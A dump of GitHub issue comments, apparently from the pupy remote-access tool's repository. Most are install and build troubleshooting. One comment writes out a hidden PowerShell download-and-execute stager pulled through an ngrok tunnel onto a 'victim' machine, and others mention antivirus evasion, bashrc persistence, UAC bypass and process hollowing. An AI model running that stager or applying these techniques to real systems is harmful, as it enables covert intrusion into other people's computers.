Corporation.  All rights reserved.\n/NXCOMPAT:NO /LTCG \n/ltcg \n/dll \n/implib:C:\\Python27\\Lib\\site-packages\\pupymemexec.lib \n/out:C:\\Python27\\Lib\\site-packages\\pupymemexec.pyd \npupymemexec.obj \nC:\\Python27\\libs\\python27.lib \nadvapi32.lib \n   Creating library C:\\Python27\\Lib\\site-packages\\pupymemexec.lib and object C:\\Python27\\Lib\\site-packages\\pupymemexec.exp\nGenerating code\nFinished generating code\nmake: Entering directory '/root/pupy/pupy/external/winpty'\nrm -fr build\nmake: Leaving directory '/root/pupy/pupy/external/winpty'\nmake: Entering directory '/root/pupy/pupy/external/winpty'\nCreating directory build/mingw/\nCopying src/shared/PrecompiledHeader.h to build/mingw/PrecompiledHeader.h\nCompiling build/mingw/PrecompiledHeader.h\nMakefile:83: recipe for target 'build/mingw/PrecompiledHeader.h.gch' failed\nmake: Leaving directory '/root/pupy/pupy/external/winpty'. Okay thanks and I forgot to mention \nIm using Kali Linux 2017 . Okay thanks . ",
    "cclauss": "```\n\n\n[Python 3 is] more fat than python2\n\nCitation needed. Besides they are both fat and at this point difference is negligible.\n```\n\"Python 3.6 is faster than any other Python version on many benchmarks.\" -- Victor Stinner\n https://us.pycon.org/2017/schedule/presentation/487. Other possibility include:\n sys.exit(\u2018Decode failed: Exiting your payload.\u2019)\n* assert False, \u2018Decode failed: Exiting your payload.\u2019\n  . \n",
    "gnomefish": "I'm on the latest build and still getting: WARNING:root:cannot import name create_ps_command : module psexec disabled.\ngit checkout unstable\nAlready on 'unstable'\nYour branch is up-to-date with 'origin/unstable'.\nJust wanted to let you know.\nL.. Okidoki, thanks!. ",
    "kres0345": "still same issue. ",
    "kernel-pan-ic": "I found the solution, I just had to install mss 2.0.22, because I had a later version installed. I just did:\npip uninstall mss\npip install mss==2.0.22. ",
    "SC4RECOIN": "3.0.0 (2017-07-06)\nRemoved enum_display_monitors() method. Use monitors property instead.. ",
    "emilyanncr": "nm. I was trippin. ",
    "N1kRolexx": "Okay. ",
    "b2az": "@quentinhardy Most AVs are detecting this now. Im developing a new staging option for powershell. Will open a Merge Request when done.. Awesome, had to study the module code, to understand whats going on.\nHopefully you're made somebodys life easier with that one!. Ok thanks, i stumbled upon those two already, but didn't had any clue.\nWell. I guess i've got to pull out my C-Books again.\nThx, for pointing to the right direction.\nThanks,\nb2az. Have you followed the installation tutorial? you have to git add the submodules.. @sid-engel Please check the solution provided by @ludoz and it this workaround works, close this issue. maybe you add the payload to the bashrc?. @zero77 check out this one:\nhttps://attack.mitre.org/wiki/Persistence\nPlease close this issue, if you are satisfied with those recommendations.. Please be more specific!. > It is difficult for newcomers to figure out...\n... the architecture of pupy.\nFeels like a never ending reverse engineering.\nWill there be a Documentation in the future?. ",
    "cnilsecure": "@b2az yes i did, it works on windows 7 btw just when i try this windows 2008 r2 it give this error. ",
    "n00py": "root@kali:~/pupy/pupy# pip install rsa\nRequirement already satisfied: rsa in /usr/local/lib/python2.7/dist-packages/rsa-3.4.2-py2.7.egg\nRequirement already satisfied: pyasn1>=0.1.3 in /usr/local/lib/python2.7/dist-packages (from rsa). that worked, thanks.\nroot@kali:/usr/local/lib/python2.7/dist-packages# unzip rsa-3.4.2-py2.7.egg. ",
    "sujatha99": "How to solve this... ",
    "GreyDireWolf": "Ok i reinstalled fresh pupy on my arch machine and installed pyautogui from repo but now i'm getting this error\nTraceback (most recent call last):\n  File \"pupysh.py\", line 36, in <module>\n    from pupylib import PupyServer\n  File \"/home/wolf/Apps/pupy/pupy/pupylib/__init__.py\", line 7, in <module>\n    from PupyServer import *\n  File \"/home/wolf/Apps/pupy/pupy/pupylib/PupyServer.py\", line 30, in <module>\n    from pupylib.PupyDnsCnc import PupyDnsCnc\n  File \"/home/wolf/Apps/pupy/pupy/pupylib/PupyDnsCnc.py\", line 4, in <module>\n    from network.lib.picocmd.server import *\n  File \"/home/wolf/Apps/pupy/pupy/network/lib/picocmd/server.py\", line 17, in <module>\n    import socketserver\nImportError: No module named socketserver. ",
    "rang0rn": "Great, can be closed! Thanks!. ",
    "ire4ever1190": "goto here for steps on how to install pyautogui. ",
    "PoireWilliams": "@ire4ever1190 i already did that, but i am getting same message. should i reinstall?. @xuxuedong I am using Kali Linux. I am using ./pupygen.py for generating a payload and using ./puppysy.py for client.. @xuxuedong I am writing  ./pupysy.py code on terminal for trying to connect to server.. ",
    "sparklespdx": "It only works if you have a display.\nOn Dec 2, 2017 2:47 AM, \"PoireWilliams\" notifications@github.com wrote:\n\n@ire4ever1190 https://github.com/ire4ever1190 i already did that, but i\nam getting same message. should i reinstall?\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/540#issuecomment-348683911, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/ABS0VAgJE4wwryMU4S0zn8wIyoHyn3Hkks5s8SrGgaJpZM4QxTac\n.\n. It's pupi, like, bug babies.\n\nOn Sat, Apr 21, 2018, 6:54 AM dytra notifications@github.com wrote:\n\neverybod loves puppy \ud83d\udc36, so say it that way \ud83d\ude00\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/601#issuecomment-383297228, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/ABS0VHRT-HyMigAxUJPDHKhCmmjeskYvks5tqzoCgaJpZM4TdtAd\n.\n. I think it's probably a better idea to recommend that people install Docker from the signed packages in the repositories, like the documentation says.\n\nhttps://docs.docker.com/install/linux/docker-ce/ubuntu/\nthere's instructions for macos and windows there as well.. ",
    "emans841": "have any one found solution to this?\n. ",
    "madtasmo": "I actually solved this by doing the following\npip install python3-xlib\nsudo apt-get install \nsudo apt-get install python3-tk\nsudo apt-get install python3-dev\npip install pyautogui\nthis was based upon the comment from \"andika223\", but instead of using pip3 use pip which is the command used in installing the requirements:\npip install -r pupy/requirements.txt . ",
    "Rhuax": "I followed all the previous replies guidelines but none of them worked for me. I'm on Ubuntu 17. I'm installing it on my machine just for tests. Why should I use ssh?. ",
    "jrenaud007": "cli or desktop ?. I removed pyautogui from requirements.txt and it worked for me, i added a section on the wiki. You're totally right, but that's the fix for now, when n1nj4 fix it i'll update the documentation.\ni plan to use this shell as a remote software for a product i'll distribute soon. i'll try to add documentation with further changes.. ",
    "salesdbs": "@Rhuax \nTente da seguinte forma:\n```\n$ xhost +\n$ sudo touch ~/.Xauthority\n$ sudo pip install pyautogui\n```\nComigo deu certo! @. ",
    "jonaed1230": "Try with this\n$ pip install setuptools\nor\n$ pip3 install setuptools. then\n$ pip3 install pyautogui\n$ pip install pyautogui. ",
    "adastmins": "Collecting M2Crypto\n  Using cached M2Crypto-0.27.0.tar.gz\nRequirement already satisfied: typing in c:\\python27\\lib\\site-packages (from M2C\nrypto)\nBuilding wheels for collected packages: M2Crypto\n  Running setup.py bdist_wheel for M2Crypto ... error\n  Complete output from command c:\\python27\\python.exe -u -c \"import setuptools,\ntokenize;file='c:\\windows\\temp\\pip-build-rk8rnr\\M2Crypto\\setup.py';f=ge\ntattr(tokenize, 'open', open)(file);code=f.read().replace('\\r\\n', '\\n');f.cl\nose();exec(compile(code, file, 'exec'))\" bdist_wheel -d c:\\windows\\temp\\tmpx\nlfdwrpip-wheel- --python-tag cp27:\n  running bdist_wheel\n  running build\n  running build_py\n  copying M2Crypto\\ASN1.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\AuthCookie.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\BIO.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\BN.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\callback.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\DH.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\DSA.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\EC.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\Engine.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\Err.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\EVP.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\ftpslib.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\httpslib.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\m2.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\m2crypto.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\m2urllib.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\m2urllib2.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\m2xmlrpclib.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\Rand.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\RC4.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\RSA.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\six.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\SMIME.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\threading.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\util.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto\\X509.py -> build\\lib.win32-2.7\\M2Crypto\n  copying M2Crypto_init__.py -> build\\lib.win32-2.7\\M2Crypto\n  creating build\\lib.win32-2.7\\M2Crypto\\PGP\n  copying M2Crypto\\PGP\\constants.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n  copying M2Crypto\\PGP\\packet.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n  copying M2Crypto\\PGP\\PublicKey.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n  copying M2Crypto\\PGP\\PublicKeyRing.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n  copying M2Crypto\\PGP\\RSA.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n  copying M2Crypto\\PGP__init__.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n  creating build\\lib.win32-2.7\\M2Crypto\\SSL\n  copying M2Crypto\\SSL\\cb.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n  copying M2Crypto\\SSL\\Checker.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n  copying M2Crypto\\SSL\\Cipher.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n  copying M2Crypto\\SSL\\Connection.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n  copying M2Crypto\\SSL\\Context.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n  copying M2Crypto\\SSL\\Session.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n  copying M2Crypto\\SSL\\SSLServer.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n  copying M2Crypto\\SSL\\ssl_dispatcher.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n  copying M2Crypto\\SSL\\timeout.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n  copying M2Crypto\\SSL\\TwistedProtocolWrapper.py -> build\\lib.win32-2.7\\M2Crypto\n\\SSL\n  copying M2Crypto\\SSL__init__.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n  running build_ext\n  building 'M2Crypto._m2crypto' extension\n  creating build\\temp.win32-2.7\n  creating build\\temp.win32-2.7\\Release\n  creating build\\temp.win32-2.7\\Release\\SWIG\n  C:\\Users\\admin\\AppData\\Local\\Programs\\Common\\Microsoft\\Visual C++ for Python\\9\n.0\\VC\\Bin\\cl.exe /c /nologo /Ox /MD /W3 /GS- /DNDEBUG -Ic:\\python27\\include -Ic:\n\\python27\\PC -Ic:\\windows\\temp\\pip-build-rk8rnr\\M2Crypto\\SWIG /TcSWIG/_m2crypto\nwrap.c /Fobuild\\temp.win32-2.7\\Release\\SWIG/_m2crypto_wrap.obj -DTHREADING -D_CR\nT_SECURE_NO_WARNINGS\n  _m2crypto_wrap.c\n  SWIG/_m2crypto_wrap.c(3550) : warning C4068: unknown pragma\n  SWIG/_m2crypto_wrap.c(3551) : warning C4068: unknown pragma\n  SWIG/_m2crypto_wrap.c(3554) : fatal error C1083: Cannot open include file: 'op\nenssl/err.h': No such file or directory\n  error: command 'C:\\Users\\admin\\AppData\\Local\\Programs\\Common\\Microsoft\\\n\\Visual C++ for Python\\9.0\\VC\\Bin\\cl.exe' failed with exit status 2\n\nFailed building wheel for M2Crypto\n  Running setup.py clean for M2Crypto\nFailed to build M2Crypto\nInstalling collected packages: M2Crypto\n  Running setup.py install for M2Crypto ... error\n    Complete output from command c:\\python27\\python.exe -u -c \"import setuptools\n, tokenize;file='c:\\windows\\temp\\pip-build-rk8rnr\\M2Crypto\\setup.py';f=\ngetattr(tokenize, 'open', open)(file);code=f.read().replace('\\r\\n', '\\n');f.\nclose();exec(compile(code, file, 'exec'))\" install --record c:\\windows\\temp\\\npip-kak0kz-record\\install-record.txt --single-version-externally-managed --compi\nle:\n    running install\n    running build\n    running build_py\n    creating build\n    creating build\\lib.win32-2.7\n    creating build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\ASN1.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\AuthCookie.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\BIO.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\BN.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\callback.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\DH.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\DSA.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\EC.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\Engine.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\Err.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\EVP.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\ftpslib.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\httpslib.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\m2.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\m2crypto.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\m2urllib.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\m2urllib2.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\m2xmlrpclib.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\Rand.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\RC4.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\RSA.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\six.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\SMIME.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\threading.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\util.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto\\X509.py -> build\\lib.win32-2.7\\M2Crypto\n    copying M2Crypto_init__.py -> build\\lib.win32-2.7\\M2Crypto\n    creating build\\lib.win32-2.7\\M2Crypto\\PGP\n    copying M2Crypto\\PGP\\constants.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n    copying M2Crypto\\PGP\\packet.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n    copying M2Crypto\\PGP\\PublicKey.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n    copying M2Crypto\\PGP\\PublicKeyRing.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n    copying M2Crypto\\PGP\\RSA.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n    copying M2Crypto\\PGP__init__.py -> build\\lib.win32-2.7\\M2Crypto\\PGP\n    creating build\\lib.win32-2.7\\M2Crypto\\SSL\n    copying M2Crypto\\SSL\\cb.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n    copying M2Crypto\\SSL\\Checker.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n    copying M2Crypto\\SSL\\Cipher.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n    copying M2Crypto\\SSL\\Connection.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n    copying M2Crypto\\SSL\\Context.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n    copying M2Crypto\\SSL\\Session.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n    copying M2Crypto\\SSL\\SSLServer.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n    copying M2Crypto\\SSL\\ssl_dispatcher.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n    copying M2Crypto\\SSL\\timeout.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n    copying M2Crypto\\SSL\\TwistedProtocolWrapper.py -> build\\lib.win32-2.7\\M2Cryp\nto\\SSL\n    copying M2Crypto\\SSL__init__.py -> build\\lib.win32-2.7\\M2Crypto\\SSL\n    running build_ext\n    building 'M2Crypto._m2crypto' extension\n    creating build\\temp.win32-2.7\n    creating build\\temp.win32-2.7\\Release\n    creating build\\temp.win32-2.7\\Release\\SWIG\n    C:\\Users\\admin\\AppData\\Local\\Programs\\Common\\Microsoft\\Visual C++ for Python\n\\9.0\\VC\\Bin\\cl.exe /c /nologo /Ox /MD /W3 /GS- /DNDEBUG -Ic:\\python27\\include -I\nc:\\python27\\PC -Ic:\\windows\\temp\\pip-build-rk8rnr\\M2Crypto\\SWIG /TcSWIG/_m2crypt\no_wrap.c /Fobuild\\temp.win32-2.7\\Release\\SWIG/_m2crypto_wrap.obj -DTHREADING -D\nCRT_SECURE_NO_WARNINGS\n    _m2crypto_wrap.c\n    SWIG/_m2crypto_wrap.c(3550) : warning C4068: unknown pragma\n    SWIG/_m2crypto_wrap.c(3551) : warning C4068: unknown pragma\n    SWIG/_m2crypto_wrap.c(3554) : fatal error C1083: Cannot open include file: '\nopenssl/err.h': No such file or directory\n    error: command 'C:\\Users\\admin\\AppData\\Local\\Programs\\Common\\Microsof\nt\\Visual C++ for Python\\9.0\\VC\\Bin\\cl.exe' failed with exit status 2\n----------------------------------------\n\nCommand \"c:\\python27\\python.exe -u -c \"import setuptools, tokenize;file='c:\\\n\\windows\\temp\\pip-build-rk8rnr\\M2Crypto\\setup.py';f=getattr(tokenize, 'open'\n, open)(file);code=f.read().replace('\\r\\n', '\\n');f.close();exec(compile(cod\ne, file, 'exec'))\" install --record c:\\windows\\temp\\pip-kak0kz-record\\instal\nl-record.txt --single-version-externally-managed --compile\" failed with error co\nde 1 in c:\\windows\\temp\\pip-build-rk8rnr\\M2Crypto. ",
    "lincoln1233": "Is this similar issue of any help? \nhttps://github.com/pyinstaller/pyinstaller/issues/2881#issuecomment-333311726\nhttps://stackoverflow.com/questions/32944919/pyinstaller-does-not-work-when-including-pysnmp\n. I had a similar issue when looking to generate a payload for a 64bit debian build.  I played around with hard coding the file generation parameters to no  avail. It wanted \"pupyx64.lin.so\" which is clearly not in the build. . Try apt-get install . ",
    "passwordleak": "Since we're not using pysnmp, what do we replace for\nhiddenimports=PyInstaller.utils.hooks.collect_submodules('pysnmp'),. I got it to run by removing the -u pupy flag, but now when I do docker start -ai pupy it just leads to a blank screen and tying commands does nothing. \n```\nroot@[redacted]:/opt/pupy# docker start -ai pupy\n[!] Xattrs not supported\n[!] You can start container with --priviliged option\nhelp\n```\n. ",
    "loco1101": "solved by running pip2 install -r pupy/requirements.txt. ",
    "ibaka9": "@lincoln1233 Yes I noticed that, I tried to copy the \"pupyx64.lin.so\" from older version of pupy, but it's still not working.. @xuxuedong so where is the source code of linux's payload?. > > compiled the payload templates via docker\n\nThis is not related to the issue, but be sure to update tc-windows (i.e. delete build-pupy-windows container, then pull alxchk/tc-windows).\n\nSometimes the failed attempt would result in an error flashing in the console (pupysh). I managed to screenshot: https://imgur.com/a/7fllY3e\n\nWell, this is another story.\nInteractive shell works like this. cmd.exe started, then WinPTY agent injected there, then pupy client establish connection to the agent using named pipes. WinPTY injected using hollowing. Hollowing implementation is not perfect (actually it's buggy and ugly).\nIn your case something went wrong during memory manipulation. Rigtht now I don't export exact errors from the library, so it's hard to find out what exactly failed.\nYou can try to duplicate or migrate module after bypassuac, it may work then.\nAlso, what is the system and bypassuac method?\n\nOK, I tried master from alxchk/pupy. The shell work perfectly in every scenario which used to failed.. ",
    "acauquil": "+1. ",
    "xs1l3n7x": "i got some code working but im running a Mac OS VM so mic doesnt work, i can share the modules if anyone wants to try it.\ncode is very messy as im fairly a begginer..... ",
    "W33v3ly": "I use my own method task scheduler+batch . ",
    "archey": "I have temporarily removed the rdesktop module in my setup, to run it without a GUI. Yeah thats great, but that just breaks the rdesktop module. I see a few ways of handling it either remove the rdesktop module completely so we dont have to use pyautogui at all. Or setup an option to only load modules that need pyautogui with a --gui option to the server. I dont think the authors intent would be to remove the module entirely as that would break current functionality. . Lets hope the option is sorted out by the Author at some point. I will close this for now. As your fix and my temporary hack are good enough for now. . ",
    "abbottjord94": "Hi, I did test on the same platform with Python 2.7.x, with Pip updated, and I got an error saying it couldn't find the rpyc.core module.. ",
    "myvyang": "seems the pyinstaller only support linux, not windows.. ",
    "jJit0": "Ok thanks.. I got another question. It's about combining Pupy + Ngrok (https://ngrok.com) using PS1_Oneliner.\nI have tried many times, but it's not working. Here are the steps that I reproduce every time:\nThe attacker and the victim are on different LANs, imagine I live in US, and my victim lives in Canada.\n1- Create the payload: pupygen -f ps1_oneliner -A x86 -O windows --randomize-hash -s hide_argv,name=svcd connect -t http --host 192.168.1.14\nI'm listening on 0.0.0.0:8080\n2- Forward the http server port to the WAN: ngrok http 192.168.1.14:8080 or ngrok http 8080\nI get then https://c6149998.ngrok.io/ -> 192.168.1.14:8080 or https://c6149998.ngrok.io/ -> localhost:8080\n3- Edit the address generated in the payload code, just like this: powershell.exe -w hidden -noni -nop -c \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object System.Net.WebClient).DownloadString('https://c6149998.ngrok.io/eiloShaegae1')\"\n4- When I Paste the code in the victim machine's cmd, I get nothing, no connection!\nEven when I paste only the url with the stager file: https://c6149998.ngrok.io/eiloShaegae1 I get an error: Bad Gateway.\nDo you have any idea about this, and have you or someone else ProofConcepted it before ?. The ngrok server is sort of MitM between me and the victim. I have checked also an ngrok alternative named https://localtunnel.github.io/www, but I got the same problem.\nActually, when I check the pupy webserver locally firefox https://192.168.1.14:8080/eiloShaegae1, I got a powershell payload page.\nNow when I forward my webserver to Ngrok server and check the payload again locally firefox https://c6149998.ngrok.io/eiloShaegae1 it doesn't recognize my server despite the good port.\nThe only thing you can do is to reproduce my steps and tell me what do you got ?. ",
    "powerskyroom": "Heeelp I'm not use pupy!!!. ",
    "muszar": "Hi, did you found a solution? I have the same issue :(. @ludoz well done, excellent solution. Thanks. ",
    "sid-engel": "I did not, gave up on it. Would love to try again if this ever gets solved.. ",
    "ludoz": "Hi guys,\nI've found the solution on stackoverflow : \npip uninstall M2crypto # remove the current error version\napt install python-m2crypto -y # install new version from the repo with the good dependencies\nCheers !. ",
    "Retr0san": "Hi yes I ran into this issue, is it referenced into the Wiki.\nBut if you navigate to the pupy folder and find the requirments.txt and remove the line \"pyautogui\", should fix your issue.\nhttps://github.com/n1nj4sec/pupy/wiki/Installation. ",
    "zero77": "Sorry, duplicate of https://github.com/n1nj4sec/pupy/issues/571. @AlessandroZ \nSo unless I am mistaken, there\u2019s no way to run a module on all your hosts and sort modules by OS at the same time?\nUnless you selected every host individually of a specific OS. . @b2az \nIs it possible to edit bashrc without being root or having root permissions.. thanks, i will have a look.. @b2az \nFor example:\n--host, 192.168.2.131:443, 192.168.2.13:8080, 192.168.2.31:80, 192.168.2.125:4444\nWhere everything after the first host is a backup, instead of just using one host, like.\n--host, 192.168.2.131:443\nFor the reasons I explained above.. @glides \n\nThe remaining problem would be if the domain becomes inaccessible\n\nYes, this is what I was thinking, but also IP. \n. ",
    "q2dg": "Well, depending on the payload, metasploit neither.... Oh, thanks a lot for your great explanation!\nIf you don't mind, I'll close the issue as solved,then\nThanks!. ",
    "sharpbazil": "Looks like it exists \nhttps://github.com/n1nj4sec/pupy/blob/master/pupy/network/lib/launchers/dnscnc.py\n. Same issue here, ran the same setup as I did before (exactly as in instructions, plus libopenssl-dev and such to build dependencies).  Fails on that same error.  Maybe m2crypto has changed?. Also, here's the error (right after generating certs):\nTraceback (most recent call last):\n  File \"pupysh.py\", line 85, in \n    credentials = PupyCredentials.Credentials()\n  File \"/home/ubuntu/pupy/pupy/pupylib/PupyCredentials.py\", line 180, in init\n    self._generate(password=password, configfile=configfile)\n  File \"/home/ubuntu/pupy/pupy/pupylib/PupyCredentials.py\", line 352, in _generate\n    SSL_CA_PRIVATE_KEY, SSL_CA_CERTIFICATE, CAKEY, CACERT = self._generate_ssl_ca()\n  File \"/home/ubuntu/pupy/pupy/pupylib/PupyCredentials.py\", line 291, in _generate_ssl_ca\n    cert.add_ext(X509.new_extension('subjectKeyIdentifier', cert.get_fingerprint()))\n  File \"/usr/local/lib/python2.7/dist-packages/M2Crypto/X509.py\", line 45, in new_extension\n    raise ValueError('value must be precomputed hash')\nValueError: value must be precomputed hash\n. The credentials expire after a year, so they're no longer valid... I'm not sure how to fix that, but you can see in pupylib/PupyCredentials.py:\ndef _generate_ssl_ca(self):\n        ca_key_pem, ca_cert_pem, ca_key = self._generate_rsa_keypair()\n        t = long(time.time())\n        now = ASN1.ASN1_UTCTIME()\n        now.set_time(t)\n        expire = ASN1.ASN1_UTCTIME()\n        expire.set_time(t + 365 * 24 * 60 * 60)\n^^^^^^^^^ there it is!  one year...\n. ",
    "Pyth3rEx": "so using 'Ctrl+c' seems to just bypass the error. I'll do some testing to see if it affects the program in any way.... ",
    "WEOCKI": "closed this on 8 Apr\n... now how fix?. ",
    "dytra": "everybody loves  puppy \ud83d\udc36, so say it that way \ud83d\ude00. ",
    "bodam7md": "i think that it's like \"p-you-pee\". ",
    "Tapmemer": "it's p-you-pee due to only one p before the y. ",
    "vanika": "any web gui Would be great. I will glad to help someone to create web gui. ",
    "anonymous920": "Thanks\nI think you are very good man\nYour email very useful\nReally thank you\n-----Original Message-----\nFrom: \"glides\"notifications@github.com\nTo: \"n1nj4sec/pupy\"pupy@noreply.github.com;\nCc: \"anonymous920\"mythirdemail@naver.com; \"Author\"author@noreply.github.com;\nSent: 2018-04-28 (\ud1a0) 22:11:25\nSubject: Re: [n1nj4sec/pupy] pupy error jarsigner: not found (#608)\nInstall the JDK\njarsigner is in %JAVA_HOME%\\bin\\jarsigner\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub, or mute the thread.\n. ",
    "currysmygod": "when i executed this order (pip install -r pupy/requirements.txt)\nThe errors are as follows\nCommand \"/usr/bin/python -u -c \"import setuptools, tokenize;file='/tmp/pip-install-xQmc2e/m2crypto/setup.py';f=getattr(tokenize, 'open', open)(file);code=f.read().replace('\\r\\n', '\\n');f.close();exec(compile(code, file, 'exec'))\" install --record /tmp/pip-record-TB4xU2/install-record.txt --single-version-externally-managed --compile\" failed with error code 1 in /tmp/pip-install-xQmc2e/m2crypto/\n@glides. ",
    "mlzxgzy": "pip uninstall m2crypto\napt-get install python-m2crypto. ",
    "Caleb1994": "I had the m2crypto compilation issue as well, but a better solution (at least on up to date Arch), is to just install the swig package (e.g. pacman -S swig) and then try to install m2crypto again. That worked for me, and keeps python libraries out of my system package manager.. ",
    "matty45": "Duplicate of issue #609 . ",
    "4rt3mi5": "I encountered the same problem. I was building a x86 version, and both exe and PS1 oneliner had the same problem.. ",
    "spenserq": "I have the same problem when the client tries to connect to my server.\nPython version at server 2.7.15\nClient:\nroot@client:/root/Desktop# ./pupy_1pYyfL.py \nException AttributeError: \"'PupyConnection' object has no attribute '_closed'\" in <object repr() failed> ignored\nServer:\n>> Exception in thread Thread-4:\nTraceback (most recent call last):\n  File \"/usr/lib/python2.7/threading.py\", line 801, in __bootstrap_inner\n    self.run()\n  File \"/usr/lib/python2.7/threading.py\", line 754, in run\n    self.__target(*self.__args, **self.__kwargs)\n  File \"/usr/share/pupy/pupy/network/lib/servers.py\", line 119, in _setup_connection\n    config=config\n  File \"/usr/share/pupy/pupy/network/lib/connection.py\", line 35, in __init__\n    Connection.__init__(self, *args, **kwargs)\nTypeError: __init__() got an unexpected keyword argument '_lazy'\n. Hi, \u201athefore\u2019 you need to uninstall newest Rpyc library and install old one == 3.4.4 - then all work great :)\nhttps://github.com/n1nj4sec/pupy/issues/622. ",
    "thefare": "me too. ",
    "backmashine": "Downgrade rpyc helped, thanks. ",
    "pathanirfan6": "I am facing same issue.. ",
    "ewelinami": "Me the same, does anyone have any ideas?. I did as you recommended and this is what log ejects:\n` \nServer started on 192.168.1.170 port 443 with transport ssl\n\n\nINFO:PUPY/443:server started on [192.168.1.170]:443\nINFO:PUPY/443:accepted 192.168.xx.xx(client IP):19544\nDEBUG:PUPY/443:192.168.xx.xx(client IP):19544 Wait for authentication result\nINFO:PUPY/443:192.168.xx.xx(client IP):19544 failed to authenticate, rejecting connection\nDEBUG:PUPY/443:192.168.xx.xx(client IP):19544 Wait complete: None\nDEBUG:PUPY/443:192.168.xx.xx(client IP):19544 Shutting down\n\n\nAnd this over and over again.\nSo it looks like it's a problem with authentication, but why and how to fix it?. ",
    "thereisnotime": "How did you solve that?. ",
